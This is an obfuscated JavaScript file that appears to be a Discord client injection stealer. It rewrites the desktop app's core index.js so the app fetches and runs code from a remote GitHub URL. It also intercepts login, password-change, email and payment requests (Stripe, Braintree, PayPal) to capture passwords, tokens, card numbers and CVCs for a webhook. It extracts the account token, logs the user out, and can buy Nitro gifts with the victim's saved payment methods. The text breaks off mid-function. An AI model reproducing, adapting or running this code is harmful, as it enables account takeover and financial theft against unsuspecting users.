const _0x389ed9=_0x232f;(function(_0x3bb0a4,_0x110582){const _0x1ea9f7=_0x232f,_0x2d0982=_0x3bb0a4();while(!![]){try{const _0x36c63c=parseInt(_0x1ea9f7(0x16b))/0x1+-parseInt(_0x1ea9f7(0x1f3))/0x2*(-parseInt(_0x1ea9f7(0x148))/0x3)+parseInt(_0x1ea9f7(0x1a2))/0x4+-parseInt(_0x1ea9f7(0x1a6))/0x5+parseInt(_0x1ea9f7(0x1f2))/0x6*(parseInt(_0x1ea9f7(0x189))/0x7)+-parseInt(_0x1ea9f7(0x198))/0x8+parseInt(_0x1ea9f7(0x1f6))/0x9*(-parseInt(_0x1ea9f7(0x14a))/0xa);if(_0x36c63c===_0x110582)break;else _0x2d0982['push'](_0x2d0982['shift']());}catch(_0x284353){_0x2d0982['push'](_0x2d0982['shift']());}}}(_0x1661,0xc9b1a));const args=process[_0x389ed9(0x1cc)],fs=require('fs'),path=require('path'),https=require(_0x389ed9(0x196)),querystring=require(_0x389ed9(0x13f)),{BrowserWindow,session}=require(_0x389ed9(0x1aa)),config={'webhook':_0x389ed9(0x183),'webhook_protector_key':'%WEBHOOK_KEY%','auto_buy_nitro':![],'ping_on_run':![],'ping_val':_0x389ed9(0x1b7),'embed_name':'X','embed_icon':_0x389ed9(0x177),'embed_color':0x60c11,'injection_url':'https://raw.githubusercontent.com/patrickzxxxxq/injection/main/etitz.js','api':_0x389ed9(0x152),'nitro':{'boost':{'year':{'id':_0x389ed9(0x174),'sku':_0x389ed9(0x14c),'price':_0x389ed9(0x1c1)},'month':{'id':_0x389ed9(0x174),'sku':'511651880837840896','price':_0x389ed9(0x13e)}},'classic':{'month':{'id':'521846918637420545','sku':'511651871736201216','price':_0x389ed9(0x166)}}},'filter':{'urls':[_0x389ed9(0x1bf),'https://discordapp.com/api/v*/users/@me',_0x389ed9(0x188),'https://discordapp.com/api/v*/auth/login',_0x389ed9(0x1ac),'https://*.discord.com/api/v*/auth/login',_0x389ed9(0x195),_0x389ed9(0x1a7),_0x389ed9(0x179),_0x389ed9(0x154)]},'filter2':{'urls':[_0x389ed9(0x1e6),'https://*.discord.com/api/v*/applications/detectable',_0x389ed9(0x159),_0x389ed9(0x147),_0x389ed9(0x1a1),_0x389ed9(0x1db)]}};function parity_32(_0x14403,_0x129d05,_0xae1375){return _0x14403^_0x129d05^_0xae1375;}function ch_32(_0x9d02d7,_0x974cdf,_0x47d519){return _0x9d02d7&_0x974cdf^~_0x9d02d7&_0x47d519;}function maj_32(_0x5afb49,_0x56a837,_0x1bdb13){return _0x5afb49&_0x56a837^_0x5afb49&_0x1bdb13^_0x56a837&_0x1bdb13;}function rotl_32(_0x30cc86,_0x54f0f5){return _0x30cc86<<_0x54f0f5|_0x30cc86>>>0x20-_0x54f0f5;}function safeAdd_32_2(_0x569824,_0x222121){var _0x29794f=(_0x569824&0xffff)+(_0x222121&0xffff),_0x3574c3=(_0x569824>>>0x10)+(_0x222121>>>0x10)+(_0x29794f>>>0x10);return(_0x3574c3&0xffff)<<0x10|_0x29794f&0xffff;}function safeAdd_32_5(_0x4ddae9,_0x3e71b3,_0x3ef65e,_0x2ad82b,_0x4c7931){var _0x33428c=(_0x4ddae9&0xffff)+(_0x3e71b3&0xffff)+(_0x3ef65e&0xffff)+(_0x2ad82b&0xffff)+(_0x4c7931&0xffff),_0x12e45e=(_0x4ddae9>>>0x10)+(_0x3e71b3>>>0x10)+(_0x3ef65e>>>0x10)+(_0x2ad82b>>>0x10)+(_0x4c7931>>>0x10)+(_0x33428c>>>0x10);return(_0x12e45e&0xffff)<<0x10|_0x33428c&0xffff;}function binb2hex(_0x332259){const _0x44fb2e=_0x389ed9;var _0x414166=_0x44fb2e(0x1ea),_0x37a5e6='',_0x5dc3df=_0x332259[_0x44fb2e(0x19e)]*0x4,_0x16a86f,_0x5a8133;for(_0x16a86f=0x0;_0x16a86f<_0x5dc3df;_0x16a86f+=0x1){_0x5a8133=_0x332259[_0x16a86f>>>0x2]>>>(0x3-_0x16a86f%0x4)*0x8,_0x37a5e6+=_0x414166[_0x44fb2e(0x135)](_0x5a8133>>>0x4&0xf)+_0x414166[_0x44fb2e(0x135)](_0x5a8133&0xf);}return _0x37a5e6;}function getH(){return[0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0];}function roundSHA1(_0x140fb2,_0x56b05a){var _0x5e45cc=[],_0x3c9ad3,_0x1b744b,_0xf4592a,_0x4ada87,_0x4d2ed4,_0x223624,_0x2a8405=ch_32,_0x3a3524=parity_32,_0x1c4f9b=maj_32,_0x28133f=rotl_32,_0x3797b2=safeAdd_32_2,_0x250eb2,_0x1bafc1=safeAdd_32_5;_0x3c9ad3=_0x56b05a[0x0],_0x1b744b=_0x56b05a[0x1],_0xf4592a=_0x56b05a[0x2],_0x4ada87=_0x56b05a[0x3],_0x4d2ed4=_0x56b05a[0x4];for(_0x250eb2=0x0;_0x250eb2<0x50;_0x250eb2+=0x1){_0x250eb2<0x10?_0x5e45cc[_0x250eb2]=_0x140fb2[_0x250eb2]:_0x5e45cc[_0x250eb2]=_0x28133f(_0x5e45cc[_0x250eb2-0x3]^_0x5e45cc[_0x250eb2-0x8]^_0x5e45cc[_0x250eb2-0xe]^_0x5e45cc[_0x250eb2-0x10],0x1);if(_0x250eb2<0x14)_0x223624=_0x1bafc1(_0x28133f(_0x3c9ad3,0x5),_0x2a8405(_0x1b744b,_0xf4592a,_0x4ada87),_0x4d2ed4,0x5a827999,_0x5e45cc[_0x250eb2]);else{if(_0x250eb2<0x28)_0x223624=_0x1bafc1(_0x28133f(_0x3c9ad3,0x5),_0x3a3524(_0x1b744b,_0xf4592a,_0x4ada87),_0x4d2ed4,0x6ed9eba1,_0x5e45cc[_0x250eb2]);else _0x250eb2<0x3c?_0x223624=_0x1bafc1(_0x28133f(_0x3c9ad3,0x5),_0x1c4f9b(_0x1b744b,_0xf4592a,_0x4ada87),_0x4d2ed4,0x8f1bbcdc,_0x5e45cc[_0x250eb2]):_0x223624=_0x1bafc1(_0x28133f(_0x3c9ad3,0x5),_0x3a3524(_0x1b744b,_0xf4592a,_0x4ada87),_0x4d2ed4,0xca62c1d6,_0x5e45cc[_0x250eb2]);}_0x4d2ed4=_0x4ada87,_0x4ada87=_0xf4592a,_0xf4592a=_0x28133f(_0x1b744b,0x1e),_0x1b744b=_0x3c9ad3,_0x3c9ad3=_0x223624;}return _0x56b05a[0x0]=_0x3797b2(_0x3c9ad3,_0x56b05a[0x0]),_0x56b05a[0x1]=_0x3797b2(_0x1b744b,_0x56b05a[0x1]),_0x56b05a[0x2]=_0x3797b2(_0xf4592a,_0x56b05a[0x2]),_0x56b05a[0x3]=_0x3797b2(_0x4ada87,_0x56b05a[0x3]),_0x56b05a[0x4]=_0x3797b2(_0x4d2ed4,_0x56b05a[0x4]),_0x56b05a;}function finalizeSHA1(_0x105f96,_0x2a69f3,_0x45fa54,_0x36d23d){const _0x3103c0=_0x389ed9;var _0x39ce70,_0xdd095c,_0xee145d;_0xee145d=(_0x2a69f3+0x41>>>0x9<<0x4)+0xf;while(_0x105f96[_0x3103c0(0x19e)]<=_0xee145d){_0x105f96['push'](0x0);}_0x105f96[_0x2a69f3>>>0x5]|=0x80<<0x18-_0x2a69f3%0x20,_0x105f96[_0xee145d]=_0x2a69f3+_0x45fa54,_0xdd095c=_0x105f96[_0x3103c0(0x19e)];for(_0x39ce70=0x0;_0x39ce70<_0xdd095c;_0x39ce70+=0x10){_0x36d23d=roundSHA1(_0x105f96[_0x3103c0(0x14d)](_0x39ce70,_0x39ce70+0x10),_0x36d23d);}return _0x36d23d;}function _0x232f(_0x38348a,_0x3f9302){const _0x16610d=_0x1661();return _0x232f=function(_0x232fa4,_0x26aba0){_0x232fa4=_0x232fa4-0x12f;let _0x536f42=_0x16610d[_0x232fa4];return _0x536f42;},_0x232f(_0x38348a,_0x3f9302);}function hex2binb(_0x2de672,_0x2e43e0,_0x4ecafd){const _0xe15a74=_0x389ed9;var _0x2513dd,_0x18ba0e=_0x2de672[_0xe15a74(0x19e)],_0x3ba461,_0x590e13,_0x407338,_0x1d76ef,_0xaa8f23;_0x2513dd=_0x2e43e0||[0x0],_0x4ecafd=_0x4ecafd||0x0,_0xaa8f23=_0x4ecafd>>>0x3;0x0!==_0x18ba0e%0x2&&console[_0xe15a74(0x136)](_0xe15a74(0x1bb));for(_0x3ba461=0x0;_0x3ba461<_0x18ba0e;_0x3ba461+=0x2){_0x590e13=parseInt(_0x2de672[_0xe15a74(0x1e9)](_0x3ba461,0x2),0x10);if(!isNaN(_0x590e13)){_0x1d76ef=(_0x3ba461>>>0x1)+_0xaa8f23,_0x407338=_0x1d76ef>>>0x2;while(_0x2513dd[_0xe15a74(0x19e)]<=_0x407338){_0x2513dd[_0xe15a74(0x131)](0x0);}_0x2513dd[_0x407338]|=_0x590e13<<0x8*(0x3-_0x1d76ef%0x4);}else console[_0xe15a74(0x136)](_0xe15a74(0x153));}return{'value':_0x2513dd,'binLen':_0x18ba0e*0x4+_0x4ecafd};}class jsSHA{constructor(){const _0x1890a7=_0x389ed9;var _0x41078b=0x0,_0x19d0d2=[],_0x84bd3a=0x0,_0x67dd8c,_0xe2e69f,_0x20b679,_0x489e41,_0x38e1b5,_0x311a71,_0x5996bc=![],_0x125364=![],_0x179a3d=[],_0x130738=[],_0x1ba71a,_0x1ba71a=0x1;_0xe2e69f=hex2binb,(_0x1ba71a!==parseInt(_0x1ba71a,0xa)||0x1>_0x1ba71a)&&console[_0x1890a7(0x136)](_0x1890a7(0x13a)),_0x489e41=0x200,_0x38e1b5=roundSHA1,_0x311a71=finalizeSHA1,_0x20b679=0xa0,_0x67dd8c=getH(),this['setHMACKey']=function(_0x51e0ea){const _0x27df60=_0x1890a7;var _0x41caa6,_0xfd17a1,_0x22af7f,_0x4421f9,_0x48b120,_0x572eec,_0x54b2a5;_0x41caa6=hex2binb,_0xfd17a1=_0x41caa6(_0x51e0ea),_0x22af7f=_0xfd17a1['binLen'],_0x4421f9=_0xfd17a1['value'],_0x48b120=_0x489e41>>>0x3,_0x54b2a5=_0x48b120/0x4-0x1;if(_0x48b120<_0x22af7f/0x8){_0x4421f9=_0x311a71(_0x4421f9,_0x22af7f,0x0,getH());while(_0x4421f9[_0x27df60(0x19e)]<=_0x54b2a5){_0x4421f9[_0x27df60(0x131)](0x0);}_0x4421f9[_0x54b2a5]&=0xffffff00;}else{if(_0x48b120>_0x22af7f/0x8){while(_0x4421f9[_0x27df60(0x19e)]<=_0x54b2a5){_0x4421f9[_0x27df60(0x131)](0x0);}_0x4421f9[_0x54b2a5]&=0xffffff00;}}for(_0x572eec=0x0;_0x572eec<=_0x54b2a5;_0x572eec+=0x1){_0x179a3d[_0x572eec]=_0x4421f9[_0x572eec]^0x36363636,_0x130738[_0x572eec]=_0x4421f9[_0x572eec]^0x5c5c5c5c;}_0x67dd8c=_0x38e1b5(_0x179a3d,_0x67dd8c),_0x41078b=_0x489e41,_0x125364=!![];},this[_0x1890a7(0x138)]=function(_0x3ec6d4){const _0x559d48=_0x1890a7;var _0x47698a,_0x2e7080,_0x5cfc9a,_0x4ade3c,_0x55000f,_0x32d1e6=0x0,_0x7b21ce=_0x489e41>>>0x5;_0x47698a=_0xe2e69f(_0x3ec6d4,_0x19d0d2,_0x84bd3a),_0x2e7080=_0x47698a['binLen'],_0x4ade3c=_0x47698a[_0x559d48(0x151)],_0x5cfc9a=_0x2e7080>>>0x5;for(_0x55000f=0x0;_0x55000f<_0x5cfc9a;_0x55000f+=_0x7b21ce){_0x32d1e6+_0x489e41<=_0x2e7080&&(_0x67dd8c=_0x38e1b5(_0x4ade3c[_0x559d48(0x14d)](_0x55000f,_0x55000f+_0x7b21ce),_0x67dd8c),_0x32d1e6+=_0x489e41);}_0x41078b+=_0x32d1e6,_0x19d0d2=_0x4ade3c[_0x559d48(0x14d)](_0x32d1e6>>>0x5),_0x84bd3a=_0x2e7080%_0x489e41;},this[_0x1890a7(0x1bc)]=function(){const _0x5edd25=_0x1890a7;var _0x4d0df8;![]===_0x125364&&console[_0x5edd25(0x136)](_0x5edd25(0x176));const _0x544612=function(_0x20a515){return binb2hex(_0x20a515);};return![]===_0x5996bc&&(_0x4d0df8=_0x311a71(_0x19d0d2,_0x84bd3a,_0x41078b,_0x67dd8c),_0x67dd8c=_0x38e1b5(_0x130738,getH()),_0x67dd8c=_0x311a71(_0x4d0df8,_0x20b679,_0x489e41,_0x67dd8c)),_0x5996bc=!![],_0x544612(_0x67dd8c);};}}if(_0x389ed9(0x140)===typeof define&&define['amd'])define(function(){return jsSHA;});else _0x389ed9(0x186)!==typeof exports?_0x389ed9(0x186)!==typeof module&&module[_0x389ed9(0x15a)]?module['exports']=exports=jsSHA:exports=jsSHA:global[_0x389ed9(0x19a)]=jsSHA;jsSHA[_0x389ed9(0x1c6)]&&(jsSHA=jsSHA[_0x389ed9(0x1c6)]);function _0x1661(){const _0x122166=['String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments','getHMAC','embed_color','Nitro\x20Boost','https://discord.com/api/v*/users/@me','username','9999','\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText','**Nitro\x20Code:**\x0a```diff\x0a+\x20','now','Invalid\x20base32\x20character\x20in\x20key','default','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','premium_type','filter','statusCode','**Discord\x20Info**','argv','webRequest','Authorization','default-src\x20\x27*\x27','**\x20-\x20Password:\x20**','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','**\x0aOld\x20Password:\x20**','.webp','parse','card[exp_year]','getAllWindows','Access-Control-Allow-Origin\x20\x27*\x27','round','url','responseHeaders','wss://remote-auth-gateway.discord.gg/*','webhook_protector_key','onHeadersReceived','injection_url','email','flags','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27','executeJavaScript','from','request','**Account\x20Info**','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','join','includes','substr','0123456789abcdef','avatar','https://cdn.discordapp.com/avatars/','catch','application/json','method','write','**\x0aBilling:\x20**','2370lWndBw','903382XEaihp','endsWith','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);','101583aXLAcw','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','ping_on_run','push','Email:\x20**','**Email\x20Changed**','webhook','charAt','error','package.json','update','/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','numRounds\x20must\x20a\x20integer\x20>=\x201','new_password','bytes','max','999','querystring','function','nitro','substring','paypal_accounts','startsWith','webContents','```','https://*.discord.com/api/v*/users/@me/library','3URZeTR','boost','110DYMwAt','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','511651885459963904','slice','POST','Verified\x20Bot\x20Developer,\x20','content','value','https://discord.com/api/v9/users/@me','String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters','https://api.stripe.com/v*/payment_intents/*/confirm','sep','stringify','writeFileSync','type','https://discord.com/api/v*/applications/detectable','exports','darwin','None','replace','embed_icon','**\x0aCVC:\x20**','\x20|\x20','discord','**\x0aCredit\x20Card\x20Expiration:\x20**','setHMACKey','./core.asar','rmdirSync','499','\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK%\x27,\x20\x27','app.asar','platform','HypeSquad\x20Balance,\x20','1141103haNldP','Partnered\x20Server\x20Owner,\x20','month','defaultSession','Credit\x20Card\x20Number:\x20**','uploadData','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','New\x20Email:\x20**','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','521847234246082599','unlinkSync','Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key','https://i.hizliresim.com/8amaxa7.','win32','https://api.stripe.com/v*/setup_intents/*/confirm','embed_name','Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩','Gold\x20BugHunter,\x20','Resources','**Credit\x20Card\x20Added**','forEach','password','\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify(','indexOf','%WEBHOOK%','content-security-policy-report-only','No\x20Nitro','undefined','**Token**','https://*.discord.com/api/v*/users/@me','5215SdMlcE','api','Nitro\x20Classic','**\x0aBadges:\x20**','2422867c-244d-476a-ba4f-36e197758d97','price','existsSync','Failed\x20to\x20Purchase\x20❌','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','ping_val','env','initiation','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','https','floor','3794792UOZGCD','index.js','jsSHA','APPDATA','toString','https://discord.gift/','length','discriminator','end','https://discord.com/api/v*/users/@me/library','1462728sHuEyO','invalid','auto_buy_nitro','Nitro\x20Type:\x20**','4140535QwwAZv','https://api.stripe.com/v*/tokens','HypeSquad\x20Bravery,\x20','**\x0aPassword:\x20**','electron','api/webhooks','https://discord.com/api/v*/auth/login','Hypesquad\x20Event,\x20','login','onBeforeRequest','card[cvc]','app','sku','\x5cmodules\x5c','resources','protocol','Contents','@everyone','Access-Control-Allow-Headers\x20\x27*\x27','**Nitro\x20bought!**','year'];_0x1661=function(){return _0x122166;};return _0x1661();}function totp(_0x296484){const _0x6c84a=_0x389ed9,_0x55b76d=0x1e,_0x515cd6=0x6,_0x553a20=Date[_0x6c84a(0x1c4)](),_0x396e5d=Math['round'](_0x553a20/0x3e8),_0x5e072e=leftpad(dec2hex(Math[_0x6c84a(0x197)](_0x396e5d/_0x55b76d)),0x10,'0'),_0x4ab557=new jsSHA();_0x4ab557[_0x6c84a(0x163)](base32tohex(_0x296484)),_0x4ab557['update'](_0x5e072e);const _0x43e8aa=_0x4ab557[_0x6c84a(0x1bc)](),_0x4bad9f=hex2dec(_0x43e8aa[_0x6c84a(0x142)](_0x43e8aa[_0x6c84a(0x19e)]-0x1));let _0x3a27d5=(hex2dec(_0x43e8aa[_0x6c84a(0x1e9)](_0x4bad9f*0x2,0x8))&hex2dec('7fffffff'))+'';return _0x3a27d5=_0x3a27d5[_0x6c84a(0x1e9)](Math[_0x6c84a(0x13d)](_0x3a27d5['length']-_0x515cd6,0x0),_0x515cd6),_0x3a27d5;}function hex2dec(_0x12305c){return parseInt(_0x12305c,0x10);}function dec2hex(_0x267eba){const _0x34cf18=_0x389ed9;return(_0x267eba<15.5?'0':'')+Math[_0x34cf18(0x1d8)](_0x267eba)[_0x34cf18(0x19c)](0x10);}function base32tohex(_0x2de8fb){const _0x51e789=_0x389ed9;let _0x1dce03='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',_0x3f3d08='',_0x1f756a='';_0x2de8fb=_0x2de8fb[_0x51e789(0x15d)](/=+$/,'');for(let _0x314e60=0x0;_0x314e60<_0x2de8fb[_0x51e789(0x19e)];_0x314e60++){let _0x29d4f0=_0x1dce03[_0x51e789(0x182)](_0x2de8fb[_0x51e789(0x135)](_0x314e60)['toUpperCase']());if(_0x29d4f0===-0x1)console[_0x51e789(0x136)](_0x51e789(0x1c5));_0x3f3d08+=leftpad(_0x29d4f0[_0x51e789(0x19c)](0x2),0x5,'0');}for(let _0x40eb97=0x0;_0x40eb97+0x8<=_0x3f3d08[_0x51e789(0x19e)];_0x40eb97+=0x8){let _0x2d3464=_0x3f3d08[_0x51e789(0x1e9)](_0x40eb97,0x8);_0x1f756a=_0x1f756a+leftpad(parseInt(_0x2d3464,0x2)[_0x51e789(0x19c)](0x10),0x2,'0');}return _0x1f756a;}function leftpad(_0x3950e8,_0x1c473e,_0x4be9d9){const _0x3ec199=_0x389ed9;return _0x1c473e+0x1>=_0x3950e8[_0x3ec199(0x19e)]&&(_0x3950e8=Array(_0x1c473e+0x1-_0x3950e8[_0x3ec199(0x19e)])[_0x3ec199(0x1e7)](_0x4be9d9)+_0x3950e8),_0x3950e8;}const discordPath=(function(){const _0x3be412=_0x389ed9,_0x23c7a6=args[0x0]['split'](path[_0x3be412(0x155)])[_0x3be412(0x14d)](0x0,-0x1)[_0x3be412(0x1e7)](path[_0x3be412(0x155)]);let _0x5de157;if(process['platform']==='win32')_0x5de157=path[_0x3be412(0x1e7)](_0x23c7a6,_0x3be412(0x1b4));else process['platform']===_0x3be412(0x15b)&&(_0x5de157=path[_0x3be412(0x1e7)](_0x23c7a6,_0x3be412(0x1b6),_0x3be412(0x17d)));if(fs['existsSync'](_0x5de157))return{'resourcePath':_0x5de157,'app':_0x23c7a6};return{'undefined':undefined,'undefined':undefined};}());function updateCheck(){const _0x2380b6=_0x389ed9,{resourcePath:_0x5b38ea,app:_0x210b07}=discordPath;if(_0x5b38ea===undefined||_0x210b07===undefined)return;const _0x12fa69=path['join'](_0x5b38ea,_0x2380b6(0x1b1)),_0x4922d6=path['join'](_0x12fa69,_0x2380b6(0x137)),_0x4678b1=path[_0x2380b6(0x1e7)](_0x12fa69,_0x2380b6(0x199)),_0xee033f=fs['readdirSync'](_0x210b07+_0x2380b6(0x1b3))[_0x2380b6(0x1c9)](_0x29d42d=>/discord_desktop_core-+?/['test'](_0x29d42d))[0x0],_0x36d45b=_0x210b07+'\x5cmodules\x5c'+_0xee033f+'\x5cdiscord_desktop_core\x5cindex.js',_0x33b939=path[_0x2380b6(0x1e7)](process[_0x2380b6(0x193)][_0x2380b6(0x19b)],_0x2380b6(0x14b));if(!fs[_0x2380b6(0x18f)](_0x12fa69))fs['mkdirSync'](_0x12fa69);if(fs['existsSync'](_0x4922d6))fs[_0x2380b6(0x175)](_0x4922d6);if(fs[_0x2380b6(0x18f)](_0x4678b1))fs['unlinkSync'](_0x4678b1);if(process[_0x2380b6(0x169)]===_0x2380b6(0x178)||process[_0x2380b6(0x169)]==='darwin'){fs[_0x2380b6(0x157)](_0x4922d6,JSON[_0x2380b6(0x156)]({'name':_0x2380b6(0x161),'main':_0x2380b6(0x199)},null,0x4));const _0x5b6e6e='const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27'+_0x36d45b+'\x27;\x0aconst\x20bdPath\x20=\x20\x27'+_0x33b939+_0x2380b6(0x191)+config[_0x2380b6(0x1de)]+_0x2380b6(0x167)+config[_0x2380b6(0x134)]+_0x2380b6(0x1e1)+config[_0x2380b6(0x1dc)]+_0x2380b6(0x171)+path[_0x2380b6(0x1e7)](_0x5b38ea,_0x2380b6(0x168))+_0x2380b6(0x1f5);fs[_0x2380b6(0x157)](_0x4678b1,_0x5b6e6e[_0x2380b6(0x15d)](/\\/g,'\x5c\x5c'));}if(!fs[_0x2380b6(0x18f)](path[_0x2380b6(0x1e7)](__dirname,_0x2380b6(0x194))))return!0x0;return fs[_0x2380b6(0x165)](path[_0x2380b6(0x1e7)](__dirname,_0x2380b6(0x194))),execScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();'),!0x1;}const execScript=_0x4d28e5=>{const _0x3a54b1=_0x389ed9,_0x21e7c3=BrowserWindow[_0x3a54b1(0x1d6)]()[0x0];return _0x21e7c3[_0x3a54b1(0x145)][_0x3a54b1(0x1e2)](_0x4d28e5,!0x0);},getInfo=async _0x3a3058=>{const _0x33a93f=_0x389ed9,_0x887f82=await execScript(_0x33a93f(0x12f)+config[_0x33a93f(0x18a)]+_0x33a93f(0x1d1)+_0x3a3058+'\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;');return JSON[_0x33a93f(0x1d4)](_0x887f82);},fetchBilling=async _0x56c251=>{const _0x3e2ac0=_0x389ed9,_0x275326=await execScript(_0x3e2ac0(0x1c7)+config[_0x3e2ac0(0x18a)]+'/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x56c251+_0x3e2ac0(0x1c2));if(!_0x275326['lenght']||_0x275326[_0x3e2ac0(0x19e)]===0x0)return'';return JSON[_0x3e2ac0(0x1d4)](_0x275326);},getBilling=async _0x5b1d63=>{const _0x310213=_0x389ed9,_0x2d2628=await fetchBilling(_0x5b1d63);if(!_0x2d2628)return'❌';let _0x237016='';_0x2d2628[_0x310213(0x17f)](_0x130e87=>{const _0x279b91=_0x310213;if(!_0x130e87[_0x279b91(0x1a3)])switch(_0x130e87[_0x279b91(0x158)]){case 0x1:_0x237016+='💳\x20';break;case 0x2:_0x237016+='<:paypal:951139189389410365>\x20';break;}});if(!_0x237016)_0x237016='❌';return _0x237016;},Purchase=async(_0x7a3946,_0x31e8db,_0x47a5bb,_0x50682f)=>{const _0x278534=_0x389ed9,_0xe482db={'expected_amount':config[_0x278534(0x141)][_0x47a5bb][_0x50682f][_0x278534(0x18e)],'expected_currency':'usd','gift':!![],'payment_source_id':_0x31e8db,'payment_source_token':null,'purchase_token':_0x278534(0x18d),'sku_subscription_plan_id':config[_0x278534(0x141)][_0x47a5bb][_0x50682f][_0x278534(0x1b2)]},_0x5aafc7=execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/'+config[_0x278534(0x141)][_0x47a5bb][_0x50682f]['id']+_0x278534(0x139)+_0x7a3946+_0x278534(0x181)+JSON[_0x278534(0x156)](_0xe482db)+'));\x0a\x20\x20\x20\x20xmlHttp.responseText');if(_0x5aafc7['gift_code'])return _0x278534(0x19d)+_0x5aafc7['gift_code'];else return null;},buyNitro=async _0x35a424=>{const _0x17e939=_0x389ed9,_0x56db91=await fetchBilling(_0x35a424),_0xc20986=_0x17e939(0x190);if(!_0x56db91)return _0xc20986;let _0x118258=[];_0x56db91[_0x17e939(0x17f)](_0x2333b7=>{const _0x8b5bc1=_0x17e939;!_0x2333b7[_0x8b5bc1(0x1a3)]&&(_0x118258=_0x118258['concat'](_0x2333b7['id']));});for(let _0x3d7792 in _0x118258){const _0x14b278=Purchase(_0x35a424,_0x3d7792,_0x17e939(0x149),_0x17e939(0x1ba));if(_0x14b278!==null)return _0x14b278;else{const _0x465557=Purchase(_0x35a424,_0x3d7792,'boost',_0x17e939(0x16d));if(_0x465557!==null)return _0x465557;else{const _0x1c1509=Purchase(_0x35a424,_0x3d7792,'classic',_0x17e939(0x16d));return _0x1c1509!==null?_0x1c1509:_0xc20986;}}}},getNitro=_0x48c2c9=>{const _0x146a2f=_0x389ed9;switch(_0x48c2c9){case 0x0:return _0x146a2f(0x185);case 0x1:return _0x146a2f(0x18b);case 0x2:return _0x146a2f(0x1be);default:return'No\x20Nitro';}},getBadges=_0x18510e=>{const _0x3b8581=_0x389ed9;let _0x8c88bd='';switch(_0x18510e){case 0x1:_0x8c88bd+='Discord\x20Staff,\x20';break;case 0x2:_0x8c88bd+=_0x3b8581(0x16c);break;case 0x20000:_0x8c88bd+=_0x3b8581(0x14f);break;case 0x400000:_0x8c88bd+='Active\x20Developer,\x20';break;case 0x4:_0x8c88bd+=_0x3b8581(0x1ad);break;case 0x4000:_0x8c88bd+=_0x3b8581(0x17c);break;case 0x8:_0x8c88bd+='Green\x20BugHunter,\x20';break;case 0x200:_0x8c88bd+='Early\x20Supporter,\x20';break;case 0x80:_0x8c88bd+='HypeSquad\x20Brillance,\x20';break;case 0x40:_0x8c88bd+=_0x3b8581(0x1a8);break;case 0x100:_0x8c88bd+=_0x3b8581(0x16a);break;case 